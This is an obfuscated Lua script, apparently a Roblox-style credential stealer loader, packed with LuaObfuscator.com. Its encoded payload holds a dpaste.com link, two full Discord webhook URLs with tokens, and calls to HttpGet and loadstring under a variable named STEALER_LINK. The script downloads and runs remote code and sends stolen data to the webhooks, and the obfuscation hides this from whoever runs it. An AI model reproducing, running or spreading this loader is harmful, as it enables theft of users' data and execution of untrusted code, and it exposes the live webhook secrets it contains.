--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then local v88=0;while true do if (v88==0) then v19=v0(v3(v30,1,1));return "";end end else local v89=v2(v0(v30,16));if v19 then local v110=0;local v111;while true do if (v110==1) then return v111;end if (v110==0) then v111=v5(v89,v19);v19=nil;v110=1;end end else return v89;end end end);local function v20(v31,v32,v33) if v33 then local v90=(v31/(((1 + 4) -3)^(v32-(2 -1))))%((3 -1)^(((v33-(2 -1)) -(v32-(620 -(555 + 64)))) + 1)) ;return v90-(v90%(932 -(857 + 74))) ;else local v91=(879 -(282 + 595))^(v32-(569 -(367 + (1838 -(1523 + 114))))) ;return (((v31%(v91 + v91))>=v91) and (928 -(214 + 713))) or (0 + 0 + 0) ;end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35,v36=v1(v16,v18,v18 + (1067 -(68 + 997)) );v18=v18 + (1272 -(226 + 1044)) ;return (v36 * (364 -108)) + v35 ;end local function v23() local v37=(86 + 31) -(32 + (265 -(67 + 113))) ;local v38;local v39;local v40;local v41;while true do if (v37==((2 -1) + 0)) then return (v41 * (3720433 + 13056783)) + (v40 * (66493 -(892 + 65))) + (v39 * (610 -354)) + v38 ;end if (v37==((0 + 0) -0)) then v38,v39,v40,v41=v1(v16,v18,v18 + ((15 -11) -1) );v18=v18 + 4 ;v37=351 -(87 + 263) ;end end end local function v24() local v42=v23();local v43=v23();local v44=(3665 -2712) -(802 + (592 -(416 + 26))) ;local v45=(v20(v43,2 -1 ,36 -16 ) * (2^32)) + v42 ;local v46=v20(v43,16 + 5 ,1028 -(915 + 82) );local v47=((v20(v43,32)==((6 -4) -1)) and  -1) or (1 + 0) ;if (v46==((0 + 0) -0)) then if (v45==(1187 -(1069 + 118))) then return v47 * 0 ;else v46=2 -1 ;v44=0;end elseif (v46==(4477 -2430)) then return ((v45==(0 + 0)) and (v47 * ((1 -0)/(0 + 0)))) or (v47 * NaN) ;end return v8(v47,v46-(1814 -(368 + 423)) ) * (v44 + (v45/((6 -4)^((123 -53) -(10 + 8))))) ;end local function v25(v48) local v49=438 -((603 -458) + 293) ;local v50;local v51;while true do if (v49==(433 -(26 + 18 + 386))) then return v6(v51);end if (v49==2) then v51={};for v112=1, #v50 do v51[v112]=v2(v1(v3(v50,v112,v112)));end v49=1489 -(998 + 488) ;end if (v49==(1 + (0 -0))) then v50=v3(v16,v18,(v18 + v48) -(3 -2) );v18=v18 + v48 ;v49=861 -(814 + 45) ;end if (v49==((0 -0) + 0)) then v50=nil;if  not v48 then v48=v23();if (v48==(772 -(201 + 571))) then return "";end end v49=1139 -(116 + 1022) ;end end end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v52=(function() return function(v92,v93,v94,v95,v96,v97,v98,v99,v100) local v101=(function() return 0 + 0 ;end)();local v92=(function() return;end)();local v93=(function() return;end)();while true do local v109=(function() return 1409 -(450 + 959) ;end)();while true do if (v109~=(1990 -(582 + 1408))) then else if (v101==1) then local v122=(function() return 0 -0 ;end)();while true do if (v122~=(0 -0)) then else while true do if (v92==(0 -0)) then v93=(function() return v94();end)();if (v95(v93, #",", #"|")==0) then local v126=(function() return 1824 -(1195 + 629) ;end)();local v127=(function() return;end)();local v128=(function() return;end)();local v129=(function() return;end)();local v130=(function() return;end)();while true do if (v126==(2 -0)) then while true do if (v127~=(243 -(187 + 54))) then else local v346=(function() return 0;end)();while true do if (v346==1) then v127=(function() return  #"asd";end)();break;end if (v346==0) then if (v95(v129, #"\\", #"\\")== #"!") then v130[2]=(function() return v96[v130[2]];end)();end if (v95(v129,782 -(162 + 618) ,2 + 0 )== #",") then v130[ #"asd"]=(function() return v96[v130[ #"-19"]];end)();end v346=(function() return 1;end)();end end end if ( #"."==v127) then local v347=(function() return 0 + 0 ;end)();local v348=(function() return;end)();while true do if (v347~=(0 -0)) then else v348=(function() return 0 -0 ;end)();while true do if (v348==(1 + 0)) then v127=(function() return 1638 -(1373 + 263) ;end)();break;end if (0==v348) then v130=(function() return {v97(),v97(),nil,nil};end)();if (v128==(1000 -(451 + 549))) then local v385=(function() return 0 + 0 ;end)();local v386=(function() return;end)();while true do if (v385~=(0 -0)) then else v386=(function() return 0 -0 ;end)();while true do if (v386~=(1384 -(746 + 638))) then else v130[ #"-19"]=(function() return v97();end)();v130[ #".dev"]=(function() return v97();end)();break;end end break;end end elseif (v128== #"[") then v130[ #"xxx"]=(function() return v98();end)();elseif (v128==2) then v130[ #"91("]=(function() return v98() -((1 + 1)^16) ;end)();elseif (v128== #"19(") then local v391=(function() return 0;end)();local v392=(function() return;end)();while true do if (v391~=(0 -0)) then else v392=(function() return 341 -(218 + 123) ;end)();while true do if (v392~=0) then else v130[ #"xxx"]=(function() return v98() -(2^(1597 -(1535 + 46))) ;end)();v130[ #"xnxx"]=(function() return v97();end)();break;end end break;end end end v348=(function() return 1 + 0 ;end)();end end break;end end end if ((0 + 0)==v127) then local v349=(function() return 0;end)();local v350=(function() return;end)();while true do if (v349~=(560 -(306 + 254))) then else v350=(function() return 0;end)();while true do if (v350==(1 + 0)) then v127=(function() return  #"{";end)();break;end if (v350==0) then v128=(function() return v95(v93,3 -1 , #"-19");end)();v129=(function() return v95(v93, #"0836",1473 -(899 + 568) );end)();v350=(function() return 1 + 0 ;end)();end end break;end end end if (v127~= #"-19") then else if (v95(v129, #"xxx", #"xnx")~= #"{") then else v130[ #"0836"]=(function() return v96[v130[ #"?id="]];end)();end v99[v100]=(function() return v130;end)();break;end end break;end if (1==v126) then local v272=(function() return 0 -0 ;end)();local v273=(function() return;end)();while true do if (v272==(603 -(268 + 335))) then v273=(function() return 290 -(60 + 230) ;end)();while true do if ((573 -(426 + 146))==v273) then v126=(function() return 1 + 1 ;end)();break;end if ((1456 -(282 + 1174))~=v273) then else v129=(function() return nil;end)();v130=(function() return nil;end)();v273=(function() return 812 -(569 + 242) ;end)();end end break;end end end if (v126==0) then local v274=(function() return 0;end)();while true do if (v274==0) then v127=(function() return 0 -0 ;end)();v128=(function() return nil;end)();v274=(function() return 1 + 0 ;end)();end if (v274==(1025 -(706 + 318))) then v126=(function() return 1;end)();break;end end end end end break;end end return v92,v93,v94,v95,v96,v97,v98,v99,v100;end end end if (v101~=0) then else local v123=(function() return 0;end)();while true do if (v123~=(1251 -(721 + 530))) then else v92=(function() return 0;end)();v93=(function() return nil;end)();v123=(function() return 1272 -(945 + 326) ;end)();end if (v123~=(2 -1)) then else v101=(function() return 1 + 0 ;end)();break;end end end break;end end end end;end)();local v53=(function() return function(v102,v103,v104) local v105=(function() return 0;end)();local v106=(function() return;end)();while true do if ((700 -(271 + 429))==v105) then v106=(function() return 0 + 0 ;end)();while true do if (v106==0) then local v124=(function() return 0;end)();while true do if (v124==0) then v102[v103-#">" ]=(function() return v104();end)();return v102,v103,v104;end end end end break;end end end;end)();local v54=(function() return {};end)();local v55=(function() return {};end)();local v56=(function() return {};end)();local v57=(function() return {v54,v55,nil,v56};end)();local v58=(function() return v23();end)();local v59=(function() return {};end)();for v67= #"!",v58 do local v68=(function() return 1500 -(1408 + 92) ;end)();local v69=(function() return;end)();local v70=(function() return;end)();local v71=(function() return;end)();while true do if (v68~=0) then else local v114=(function() return 0;end)();while true do if (v114~=1) then else v68=(function() return 1087 -(461 + 625) ;end)();break;end if (v114==0) then v69=(function() return 0;end)();v70=(function() return nil;end)();v114=(function() return 1;end)();end end end if (v68==1) then v71=(function() return nil;end)();while true do if (v69==(1288 -(993 + 295))) then v70=(function() return v21();end)();v71=(function() return nil;end)();v69=(function() return 1;end)();end if (v69~=1) then else if (v70== #"|") then v71=(function() return v21()~=0 ;end)();elseif (v70==2) then v71=(function() return v24();end)();elseif (v70== #"-19") then v71=(function() return v25();end)();end v59[v67]=(function() return v71;end)();break;end end break;end end end v57[ #"gha"]=(function() return v21();end)();for v72= #" ",v23() do FlatIdent_5ED46,Descriptor,v21,v20,v59,v22,v23,v54,v72=(function() return v52(FlatIdent_5ED46,Descriptor,v21,v20,v59,v22,v23,v54,v72);end)();end for v73= #"|",v23() do v55,v73,v28=(function() return v53(v55,v73,v28);end)();end return v57;end local function v29(v61,v62,v63) local v64=v61[1 + 0 ];local v65=v61[1173 -(418 + 753) ];local v66=v61[2 + 1 ];return function(...) local v74=v64;local v75=v65;local v76=v66;local v77=v27;local v78=1 + 0 ;local v79= -(1 + 0);local v80={};local v81={...};local v82=v12("#",...) -(1 + 0) ;local v83={};local v84={};for v107=529 -(406 + 123) ,v82 do if (v107>=v76) then v80[v107-v76 ]=v81[v107 + (1770 -(1749 + 20)) ];else v84[v107]=v81[v107 + 1 + 0 + 0 ];end end local v85=(v82-v76) + 1 + 0 ;local v86;local v87;while true do local v108=1322 -(1249 + 73) ;while true do if ((v108==(0 + 0)) or (4439<=2350)) then v86=v74[v78];v87=v86[1146 -(466 + 679) ];v108=2 -1 ;end if ((2 -1)==v108) then if (v87<=(1932 -(106 + 1794))) then if (v87<=(5 + 10)) then if (v87<=((5 -3) + 5)) then if (v87<=((26 -18) -5)) then if (v87<=1) then if (v87>(0 -0)) then v84[v86[1 + 1 ]]=v84[v86[3]];else local v133=v86[116 -(4 + 110) ];do return v84[v133](v13(v84,v133 + (585 -(57 + 527)) ,v86[3]));end end elseif (v87==(1429 -(41 + 1386))) then v84[v86[105 -(7 + 10 + 86) ]]=v84[v86[3]] + v86[4 + 0 ] ;else v78=v86[3 + 0 ];end elseif (v87<=(11 -6)) then if (v87>4) then local v136=v86[(4 + 1) -3 ];local v137=v84[v136 + (168 -(57 + 65 + 44)) ];local v138=v84[v136] + v137 ;v84[v136]=v138;if (v137>0) then if ((v138<=v84[v136 + 1 ]) or (2705==1393) or (4479<4466)) then local v322=0;while true do if ((2547>1225) and (v322==((1433 -(797 + 636)) -0))) then v78=v86[9 -6 ];v84[v136 + 3 + 0 ]=v138;break;end end end elseif (v138>=v84[v136 + (4 -3) + (1619 -(1427 + 192)) ]) then v78=v86[(2 + 3) -2 ];v84[v136 + (68 -(30 + 35)) ]=v138;end elseif ( not v84[v86[2 + 0 ]] or (4601<61)) then v78=v78 + (1258 -(1043 + 214)) ;else v78=v86[3];end elseif (v87>(22 -16)) then local v140=v86[1214 -(323 + 889) ];local v141,v142=v77(v84[v140](v13(v84,v140 + (2 -1) ,v86[(1353 -770) -(361 + 219) ])));v79=(v142 + v140) -1 ;local v143=0;for v250=v140,v79 do local v251=0;while true do if ((v251==(320 -(53 + 267))) or (1390>=4744)) then v143=v143 + 1 ;v84[v250]=v141[v143];break;end end end else v84[v86[2]]=v84[v86[1 + 2 ]]%v86[417 -(15 + 398) ] ;end elseif (v87<=(993 -(18 + 964))) then if (v87<=9) then if ((4671>2674) and (v87==(30 -22))) then local v145=0 + 0 + 0 ;local v146;while true do if ((v145==0) or (3696<3327)) then v146=v86[2 + 0 ];v84[v146]=v84[v146](v13(v84,v146 + (851 -(20 + 830)) ,v79));break;end end else local v147=0;local v148;local v149;while true do if ((v147==(0 + 0 + 0)) or (2003>3834)) then v148=v86[128 -((442 -(192 + 134)) + 10) ];v149=v84[v86[3]];v147=(1277 -(316 + 960)) + 0 ;end if (v147==(739 -(542 + 196))) then v84[v148 + 1 ]=v149;v84[v148]=v149[v86[8 -4 ]];break;end end end elseif ((v87>(3 + 7)) or (4542==2970)) then local v150=v86[2 + 0 + 0 ];local v151=v84[v150];local v152=v86[2 + 0 + 1 ];for v252=2 -1 ,v152 do v151[v252]=v84[v150 + v252 ];end else local v153=v86[2];local v154,v155=v77(v84[v153](v13(v84,v153 + 1 ,v79)));v79=(v155 + v153) -((2 + 0) -1) ;local v156=1551 -(1126 + 425) ;for v255=v153,v79 do local v256=405 -(118 + (1097 -810)) ;while true do if (v256==(551 -(83 + 468))) then v156=v156 + (3 -2) ;v84[v255]=v154[v156];break;end end end end elseif (v87<=(1134 -(118 + 1003))) then if (v87==(35 -23)) then v84[v86[(2185 -(1202 + 604)) -(142 + 235) ]]=v86[13 -10 ]~=0 ;else v84[v86[1 + 1 ]]=v86[3] + v84[v86[981 -(553 + 424) ]] ;end elseif (v87==(26 -12)) then v84[v86[2]]=v62[v86[3 + 0 ]];else local v161=0 + 0 ;local v162;local v163;while true do if (v161==1) then v84[v162 + 1 ]=v163;v84[v162]=v163[v86[3 + 1 ]];break;end if (v161==(0 + 0)) then v162=v86[2 + 0 ];v163=v84[v86[6 -3 ]];v161=2 -1 ;end end end elseif ((252<=1977) and ((v87<=23) or (156>3913))) then if ((195==195) and (v87<=(42 -23))) then if ((v87<=(5 + 12)) or (1436==3775)) then if (v87==(77 -(284 -223))) then v84[v86[2]]=v86[756 -(239 + 514) ];else local v166=0 + 0 ;local v167;local v168;local v169;local v170;while true do if ((v166==(1329 -(797 + 532))) or (1618<930)) then v167=v86[2 + 0 ];v168,v169=v77(v84[v167](v84[v167 + (1 -0) + 0 ]));v166=2 -1 ;end if ((3105>=1796) and (v166==(1203 -(373 + 829)))) then v79=(v169 + v167) -(732 -(476 + 255)) ;v170=0;v166=1132 -(369 + 761) ;end if ((4379>=2131) and (v166==(2 + 0))) then for v329=v167,v79 do local v330=0 -0 ;while true do if ((4723>4153) and (v330==0)) then v170=v170 + (1 -(0 -0)) ;v84[v329]=v168[v170];break;end end end break;end end end elseif ((3844>=2043) and (v87>(256 -(64 + 174)))) then do return;end else v84[v86[2]]=v86[3]~=0 ;end elseif (v87<=(3 + 18)) then if ((v87>(29 -9)) or (3654>=4654)) then v84[v86[338 -(144 + 192) ]]=v84[v86[3]]%v84[v86[220 -(42 + 174) ]] ;else v84[v86[(327 -(45 + 280)) + 0 + 0 ]]=v84[v86[3 + 0 + 0 ]]%v86[4] ;end elseif ((951<=1496) and (v87>(10 + 12))) then local v174=0;local v175;local v176;local v177;local v178;while true do if ((v174==(1506 -(363 + 1141))) or (1736==571)) then for v331=v175,v79 do v178=v178 + (1581 -(1183 + 397)) ;v84[v331]=v176[v178];end break;end if ((v174==(2 -1)) or (3232<=2731)) then v79=(v177 + v175) -1 ;v178=0 + 0 ;v174=2;end if ((v174==(0 + 0)) or (896>4769)) then v175=v86[2];v176,v177=v77(v84[v175](v13(v84,v175 + (1976 -(1913 + 23 + 39)) ,v79)));v174=1 + 0 ;end end elseif  not v84[v86[5 -3 ]] then v78=v78 + (1934 -(565 + 1368)) ;else v78=v86[11 -8 ];end elseif ((v87<=(1688 -(1477 + 184))) or (1045<=1020)) then if (v87<=(33 -8)) then if ((4905==4905) and (v87>(23 + 1))) then v84[v86[858 -(564 + 292) ]]();else v84[v86[2 -0 ]]=v86[3];end elseif (v87>(78 -52)) then local v181=(169 + 135) -(244 + 60) ;local v182;local v183;local v184;while true do if (((1 + 0)==v181) or (1160<=328)) then v184=v84[v182 + (478 -(41 + 435)) ];if (v184>(1001 -(165 + 773 + 63))) then if ((v183>v84[v182 + 1 ]) or (4136>=4411)) then v78=v86[3 + 0 ];else v84[v182 + (5 -2) ]=v183;end elseif ((3808>2924) and (v183<v84[v182 + (1126 -((2847 -(340 + 1571)) + 189)) ])) then v78=v86[1 + 2 ];else v84[v182 + 2 + 1 ]=v183;end break;end if (v181==(1613 -(1565 + 48))) then v182=v86[2 + 0 ];v183=v84[v182];v181=1139 -(782 + 356) ;end end else local v185=267 -(176 + 91) ;local v186;while true do if ((v185==(0 -0)) or (2958==4017)) then v186=v86[2 -0 ];v84[v186]=v84[v186](v13(v84,v186 + 1 ,v86[1095 -(975 + 117) ]));break;end end end elseif (v87<=29) then if ((3891<4919) and (v87==(1903 -(157 + 1718)))) then local v187=v86[2 + 0 ];do return v84[v187](v13(v84,v187 + (3 -2) ,v86[10 -7 ]));end else local v188=1018 -(697 + 321) ;local v189;while true do if (v188==(0 -0)) then v189=v86[3 -1 ];v84[v189]=v84[v189](v13(v84,v189 + (2 -1) ,v79));break;end end end elseif ((1228>=813) and (v87<=(12 + 18))) then v84[v86[1774 -(1733 + 39) ]]= #v84[v86[5 -2 ]];elseif ((v87>(83 -52)) or (3455>4050)) then v84[v86[5 -3 ]]=v62[v86[1037 -(125 + 909) ]];elseif ((v84[v86[1229 -(322 + 905) ]]==v86[(2563 -(1096 + 852)) -(602 + 9) ]) or (2234<=1502)) then v78=v78 + 1 ;else v78=v86[1192 -(449 + 740) ];end elseif (v87<=(921 -(371 + 455 + 46))) then if ((243==243) and (v87<=(987 -((349 -104) + 681 + 21)))) then if ((v87<=(113 -(589 -(409 + 103)))) or (2512<432)) then if ((v87<=(11 + 23)) or (271>1572) or (1848==865)) then if (v87==(1931 -(260 + 1638))) then v84[v86[442 -(382 + 58) ]][v84[v86[(245 -(46 + 190)) -6 ]]]=v84[v86[4 + 0 ]];else v84[v86[3 -1 ]]={};end elseif ((v87==35) or (4682<=4541)) then local v194=0 -(95 -(51 + 44)) ;local v195;while true do if ((2739<3293) and (0==v194)) then v195=v86[1 + 1 ];do return v13(v84,v195,v79);end break;end end else local v196=1205 -(902 + 303) ;local v197;local v198;local v199;while true do if ((v196==(1 -0)) or (3026>=4046)) then v199=v86[6 -3 ];for v335=1 + 0 ,v199 do v198[v335]=v84[v197 + v335 ];end break;end if (v196==(1690 -((2438 -(1114 + 203)) + 569))) then v197=v86[216 -(22 + 192) ];v198=v84[v197];v196=684 -(483 + 200) ;end end end elseif ((v87<=(1501 -(1404 + 59))) or (3942<1134)) then if (v87>(763 -(228 + 498))) then v84[v86[5 -3 ]][v86[3]]=v84[v86[4 -0 ]];else v84[v86[767 -(468 + 297) ]]=v84[v86[565 -(334 + 228) ]] + v86[13 -9 ] ;end elseif ((v87==(89 -50)) or (2693==4973)) then local v203=0 -0 ;local v204;while true do if ((2008>638) and (v203==(0 + 0))) then v204=v86[238 -(141 + 95) ];do return v13(v84,v204,v79);end break;end end else v84[v86[2]][v84[v86[3]]]=v86[4 + 0 ];end elseif (v87<=(112 -68)) then if (v87<=(100 -58)) then if (v87>(10 + 31)) then v84[v86[2]]=v84[v86[8 -(2 + 3) ]]%v84[v86[3 + 1 ]] ;else v84[v86[2 + 0 ]]={};end elseif (v87==(60 -17)) then v84[v86[2 + 0 ]]();else local v209=v86[165 -(92 + 71) ];local v210=v84[v209];for v257=v209 + 1 ,v86[2 + 1 ] do v7(v210,v84[v257]);end end elseif (v87<=(77 -31)) then if ((1775<=3233) and (v87==((448 + 362) -((1237 -(174 + 489)) + 191)))) then local v211=v86[2 + 0 ];v84[v211]=v84[v211](v13(v84,v211 + (2 -(2 -1)) ,v86[2 + 1 ]));else v84[v86[851 -(254 + 595) ]]=v84[v86[129 -((1960 -(830 + 1075)) + 71) ]];end elseif ((v87<=47) or (4543==1997)) then v78=v86[3 -0 ];elseif (v87>48) then v84[v86[2]]= #v84[v86[(2317 -(303 + 221)) -(573 + 1217) ]];else v84[v86[5 -(1272 -(231 + 1038)) ]][v86[1 + 2 ]]=v84[v86[5 -1 ]];end elseif (v87<=57) then if ((2146==2146) and (v87<=(992 -(714 + 225)))) then if ((v87<=(148 -97)) or (2244==3224)) then if (v87==(69 -19)) then local v216=v86[1 + 1 ];local v217,v218=v77(v84[v216](v84[v216 + (1 -0) ]));v79=(v218 + v216) -(807 -(118 + 688)) ;local v219=48 -(21 + 4 + 23) ;for v258=v216,v79 do v219=v219 + 1 + 0 ;v84[v258]=v217[v219];end else v84[v86[1888 -(927 + 959) ]]=v86[1165 -(171 + 991) ] + v84[v86[13 -9 ]] ;end elseif ((v87>(784 -(16 + 716))) or (3102<728)) then v84[v86[3 -1 ]]=v84[v86[100 -((45 -34) + 86) ]][v86[(23 -14) -5 ]];else local v223=v75[v86[288 -(175 + 110) ]];local v224;local v225={};v224=v10({},{__index=function(v261,v262) local v263=v225[v262];return v263[2 -1 ][v263[9 -7 ]];end,__newindex=function(v264,v265,v266) local v267=1796 -(503 + 1293) ;local v268;while true do if ((0 -0)==v267) then v268=v225[v265];v268[1][v268[2 + 0 ]]=v266;break;end end end});for v269=1062 -(810 + 251) ,v86[3 + 1 ] do v78=v78 + 1 + 0 ;local v270=v74[v78];if ((345==345) and ((v270[1 + 0 ]==(579 -(43 + 490))) or (4904<=1916))) then v225[v269-(734 -(570 + 141 + 22)) ]={v84,v270[1 + 2 ]};else v225[v269-(1 -(0 -0)) ]={v62,v270[3]};end v83[ #v83 + (1745 -(1344 + 400)) ]=v225;end v84[v86[407 -(255 + 150) ]]=v29(v223,v224,v63);end elseif ((v87<=(44 + 11)) or (2827<378)) then if ((90<=1065) and (v87>54)) then v84[v86[2 + 0 ]]=v84[v86[(18 -6) -9 ]][v86[12 -8 ]];elseif (v84[v86[6 -4 ]]==v86[4]) then v78=v78 + (1740 -(404 + 1335)) ;else v78=v86[409 -(183 + 223) ];end elseif (v87>(67 -11)) then v84[v86[(1250 -(111 + 1137)) + (158 -(91 + 67)) ]][v84[v86[3]]]=v84[v86[2 + (5 -3) ]];else do return;end end elseif (((4802==4802) and (v87<=61)) or (3476<2597)) then if ((3079<4794) and ((v87<=59) or (2280<=511))) then if (v87>(395 -(10 + 327))) then local v231=0;local v232;local v233;local v234;while true do if ((v231==(0 + 0)) or (1676<=463)) then v232=v86[340 -(118 + 220) ];v233=v84[v232 + 1 + 1 ];v231=1 + 0 ;end if (v231==2) then if ((3869==3869) and (v233>(449 -(108 + (864 -(423 + 100)))))) then if (v234<=v84[v232 + 1 + 0 ]) then local v374=0 -0 ;while true do if ((4854>4464) and (v374==((11 + 1482) -(711 + 782)))) then v78=v86[5 -2 ];v84[v232 + (472 -(270 + 199)) ]=v234;break;end end end elseif ((v234>=v84[v232 + 1 + 0 ]) or (4912==3758)) then v78=v86[1822 -(580 + 1239) ];v84[v232 + (8 -5) ]=v234;end break;end if (v231==(1 + 0)) then v234=v84[v232] + v233 ;v84[v232]=v234;v231=1 + 1 ;end end else local v235=v86[1 + 1 ];v84[v235](v13(v84,v235 + (2 -1) ,v79));end elseif (v87>(38 + 22)) then local v236=1167 -(645 + 522) ;local v237;local v238;local v239;local v240;while true do if (v236==(1790 -(1010 + 780))) then v237=v86[2 + 0 ];v238,v239=v77(v84[v237](v13(v84,v237 + (4 -3) ,v86[8 -5 ])));v236=1837 -(1045 + 791) ;end if ((126<=3482) and (1158<=2613) and (v236==2)) then for v340=v237,v79 do local v341=0 -0 ;while true do if (v341==(0 -0)) then v240=v240 + 1 ;v84[v340]=v238[v240];break;end end end break;end if ((506 -(351 + (426 -272)))==v236) then v79=(v239 + v237) -(1575 -(1281 + 293)) ;v240=0;v236=268 -(15 + 13 + 238) ;end end else local v241=v86[4 -2 ];local v242=v84[v241];local v243=v84[v241 + ((2332 -(326 + 445)) -(1381 + 178)) ];if (v243>(0 + 0)) then if ((v242>v84[v241 + 1 + 0 ]) or (2364<=1999)) then v78=v86[2 + (4 -3) ];else v84[v241 + 3 ]=v242;end elseif ((v242<v84[v241 + (3 -2) ]) or (4922<194)) then v78=v86[2 + 1 ];else v84[v241 + (473 -(381 + 89)) ]=v242;end end elseif ((v87<=(56 + 7)) or (2091<31) or (2374==4374)) then if (v87==62) then v84[v86[2]][v84[v86[3 + 0 ]]]=v86[8 -4 ];else local v246=0 -(0 -0) ;local v247;while true do if ((v246==(1156 -(1074 + 82))) or (2430>=4872)) then v247=v86[3 -1 ];v84[v247](v13(v84,v247 + (1785 -(214 + 1570)) ,v79));break;end end end elseif ((1575==1575) and (v87<=((2230 -(530 + 181)) -(990 + 465)))) then v84[v86[1 + 1 ]]=v63[v86[2 + 1 ]];elseif (v87>65) then local v283=0 + 0 ;local v284;local v285;local v286;while true do if ((3 -2)==v283) then v286={};v285=v10({},{__index=function(v354,v355) local v356=v286[v355];return v356[1][v356[1728 -(1668 + 58) ]];end,__newindex=function(v357,v358,v359) local v360=v286[v358];v360[627 -(512 + 114) ][v360[5 -3 ]]=v359;end});v283=(884 -(614 + 267)) -1 ;end if ((v283==(0 -0)) or (2234==1455)) then v284=v75[v86[2 + 1 ]];v285=nil;v283=1 + 0 ;end if ((v283==2) or (1067>1779)) then for v362=(33 -(19 + 13)) + 0 ,v86[13 -9 ] do v78=v78 + 1 ;local v363=v74[v78];if ((v363[1995 -(109 + 1885) ]==(1515 -(1269 + 200))) or (4770<1735)) then v286[v362-1 ]={v84,v363[818 -(98 + 717) ]};else v286[v362-(827 -(802 + 24)) ]={v62,v363[5 -2 ]};end v83[ #v83 + 1 ]=v286;end v84[v86[2]]=v29(v284,v285,v63);break;end end else v84[v86[2 -0 ]]=v63[v86[1 + 2 ]];end v78=v78 + 1 + 0 ;break;end end end end;end return v29(v28(),{},v17)(...);end return v15("LOL!283Q0003063Q00737472696E6703043Q006368617203043Q00627974652Q033Q0073756203053Q0062697433322Q033Q0062697403043Q0062786F7203053Q007461626C6503063Q00636F6E63617403063Q00696E73657274026Q00204003103Q0047F7DD381F5CF3C8272471F8D43B1C7F03053Q0073149ABC54026Q001840030E3Q00858C4480746844908041A072735C03073Q0037C7E523C81D1C026Q001440030B3Q00F14D2AE87C543BF34B6BB703073Q00569C2018851D26026Q001040030B3Q007EA8ECF547247EAAB5EB1703063Q005613C5DE9826026Q000840030A3Q00DBF6F92913C4F6A42F0103053Q0072B69BCB44027Q004003093Q0023AF233CF0511B4C0503083Q002976DC464E9E3076028Q00030C3Q00FE1EE0F26A2Q11F206ECFD6D03073Q0043AD4AA5B3265403023Q005F4703203Q00682Q7470733A2Q2F6470617374652E636F6D2F4353455A3638544C332E747874026Q00F03F03793Q00682Q7470733A2Q2F646973636F72642E636F6D2F6170692F776562682Q6F6B732F313237312Q38333933313039353932343Q382F576D374F426856354733474C6D75316F4639324C6533764E6D446C5F4B446A4E52514B696A7941464F645F3635426A6F6C31614C4B4151395A5856546B396E5047574D4E03793Q00682Q7470733A2Q2F646973636F72642E636F6D2F6170692F776562682Q6F6B732F313235383Q39373233323639302Q332Q39342F7651462Q684C645A6A55796F337467757077664E505956697444656E6659737835764C6E57384D757357555750626F61706251304E6D544348775044584D513731334372030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q7470476574030C3Q00535445414C45525F4C494E4B00604Q00297Q001240000100013Q002037000100010002001240000200013Q002037000200020003001240000300013Q002037000300030004001240000400053Q0006160004000B000100010004033Q000B0001001240000400063Q002037000500040007001240000600083Q002037000600060009001240000700083Q00203700070007000A00063400083Q000100062Q002E3Q00074Q002E3Q00014Q002E3Q00054Q002E3Q00024Q002E3Q00034Q002E3Q00064Q0001000900083Q001210000A000C3Q001210000B000D4Q001A0009000B00020010263Q000B00092Q0001000900083Q001210000A000F3Q001210000B00104Q001A0009000B00020010263Q000E00092Q0001000900083Q001210000A00123Q001210000B00134Q001A0009000B00020010263Q001100092Q0001000900083Q001210000A00153Q001210000B00164Q001A0009000B00020010263Q001400092Q0001000900083Q001210000A00183Q001210000B00194Q001A0009000B00020010263Q001700092Q0001000900083Q001210000A001B3Q001210000B001C4Q001A0009000B00020010263Q001A00092Q0001000900083Q001210000A001E3Q001210000B001F4Q001A0009000B00020010263Q001D00090012100009001D3Q00261F000900490001001D0004033Q00490001001240000A00203Q002037000B3Q001D00203E000A000B0021001240000A00203Q002037000B3Q001A2Q0029000C00033Q002037000D3Q0017002037000E3Q0014002037000F3Q00112Q0024000C000300012Q0021000A000B000C001210000900223Q00261F00090052000100220004033Q00520001001240000A00203Q002037000B3Q000E00203E000A000B0023001240000A00203Q002037000B3Q000B00203E000A000B00240012100009001A3Q00261F0009003B0001001A0004033Q003B0001001240000A00253Q001240000B00263Q00200F000B000B0027001240000D00203Q002037000D000D00282Q0012000E00014Q0007000B000E4Q001D000A3Q00022Q002B000A000100010004033Q005F00010004033Q003B00012Q00383Q00013Q00013Q00023Q00026Q00F03F026Q00704002264Q002900025Q001210000300014Q003100045Q001210000500013Q00041B0003002100012Q002000076Q0001000800024Q0020000900014Q0020000A00024Q0020000B00034Q0020000C00044Q0001000D6Q0001000E00063Q002002000F000600012Q0007000C000F4Q001D000B3Q00022Q0020000C00034Q0020000D00044Q0001000E00014Q0031000F00014Q0015000F0006000F00100D000F0001000F2Q0031001000014Q001500100006001000100D0010000100100020020010001000012Q0007000D00104Q000A000C6Q001D000A3Q0002002014000A000A00022Q00110009000A4Q003F00073Q000100043B0003000500012Q0020000300054Q0001000400024Q001C000300044Q002700036Q00383Q00017Q00",v9(),...);
